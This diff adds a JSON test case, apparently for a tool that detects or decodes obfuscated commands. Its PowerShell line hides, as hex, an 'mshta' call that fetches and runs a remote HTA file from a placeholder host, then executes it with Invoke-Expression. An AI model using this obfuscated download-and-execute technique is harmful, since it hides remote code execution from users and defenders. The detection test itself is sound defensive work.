@@ -1,0 +1,11 @@
+{
+  "id": "ps-hex-csv-10-mut3",
+  "category": "ps-hex-csv",
+  "command_line": "$h='6d,73,68,74,61,20,68,74,74,70,3a,2f,2f,61,2e,62,2f,63,2e,68,74,61'; $c = $h -split ',' | ForEach-Object {[char][int]('0x'+$_)}; Invoke-Expression ($c -join '')\n# comment-3",
+  "expected_keywords": [
+    "mshta",
+    "a.b"
+  ],
+  "source": "nivxray-rc40-obfuscation",
+  "license": "CC-BY-4.0"
+}
